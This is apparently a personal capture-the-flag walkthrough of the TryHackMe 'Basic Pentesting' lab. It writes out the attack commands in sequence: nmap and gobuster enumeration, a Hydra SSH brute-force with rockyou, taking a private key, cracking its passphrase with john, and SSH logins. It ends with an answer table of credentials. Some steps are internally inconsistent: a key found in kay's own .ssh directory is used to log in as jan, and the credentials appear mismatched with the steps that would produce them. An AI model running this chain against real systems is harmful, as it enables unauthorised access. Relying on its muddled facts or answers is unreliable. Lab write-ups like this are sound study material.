# TryHackMe: Basic Pentesting â€” Personal Walkthrough

This is my personal walkthrough for the TryHackMe "Basic Pentesting" machine, following the steps I took, terminal screenshots, and detailed explanations for each stage.

---

## 1. Deploying the Machine and Connecting

After deploying the machine from the TryHackMe dashboard, I connected to the VPN using my `.ovpn` configuration file:

```sh
sudo openvpn tryhackme.ovpn
```



I grabbed the target machine IP (e.g., `10.10.184.96`) from the TryHackMe interface.

---

## 2. Reconnaissance: Discovering Open Ports

I started with a basic Nmap scan to enumerate open ports and services:

```sh
nmap -sC -sV -oA nmap/basic 10.10.184.96
```




**Explanation:**  
- `-sC`: Run default scripts (useful for version detection and additional info).
- `-sV`: Detect service/version info.
- `-oA nmap/basic`: Output results in all formats with a basename.

**Key Ports Found:**  
- 22/tcp (SSH)
- 80/tcp (HTTP)

---

## 3. Web Enumeration: Finding Hidden Directories

I visited `http://10.10.184.96` in my browser, saw the default Apache page, then ran Gobuster to look for directories:

```sh
gobuster dir -u http://10.10.184.96 -w /usr/share/wordlists/dirb/common.txt
```


**Result:**  
Found `/development`

**Explanation:**  
Gobuster brute-forces directory names using a wordlist. This helps find hidden or unlinked directories.

---

## 4. Exploring `/development` Directory

Navigating to `http://10.10.184.96/development`, I found two files: `dev.txt` and `j.txt`.

- `dev.txt` contained:  
  ```
  Just a test, nothing to see here.
  ```
- `j.txt` contained potential usernames:  
  ```
  James
  Kay
  ```

## 5. SSH Brute-Force: Finding Valid Credentials

I created a user list and used Hydra to brute-force SSH logins with the popular `rockyou.txt` password list:

`users.txt`:
```
kay
james
```

**Command:**
```sh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.184.96
```


**Result:**  
- Username: kay  
- Password: beeswax

**Explanation:**  
Hydra is a fast login cracker. Here, it tried each username with every password in the wordlist against the SSH service.

---

## 6. Logging in via SSH

With valid credentials, I logged in as kay:

```sh
ssh kay@10.10.184.96
# Password: beeswax
```


---

## 7. Privilege Escalation: Enumerating for Other Users

After logging in, I checked for other users:

```sh
ls /home
```

**Result:**
```
kay  jan
```


**Explanation:**  
Finding another user (`jan`) can be a vector for lateral movement or privilege escalation.

---

## 8. Looking for Ways to Become jan

I looked for SSH keys:

```sh
ls -la /home/kay/.ssh
```

Found an `id_rsa` private key. I copied it to my attacker machine.


---

## 9. Cracking the SSH Key Passphrase

The private key was passphrase-protected. I used `ssh2john` and `john` to crack it:

```sh
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```


**Result:**  
Passphrase found: `armando`

---

## 10. SSH as jan with the Cracked Key

I set proper permissions and logged in:

```sh
chmod 600 id_rsa
ssh -i id_rsa jan@10.10.184.96
# Passphrase: armando
```


---

## 11. Summary Table

| Step                        | Value         |
|-----------------------------|--------------|
| Hidden Directory            | development  |
| Username                    | kay          |
| Password                    | beeswax      |
| Service (abbreviation)      | SSH          |
| Other User                  | jan          |
| Final Password/Key Passphrase| armando     |

---

## Reflection

- **Nmap** and **Gobuster** are essential for initial enumeration.
- Username lists from on-server files can be crucial for brute-forcing.
- Privilege escalation often involves looking for keys or readable secrets in home directories.
- **John the Ripper** can crack private key passphrases quickly with the right wordlist.
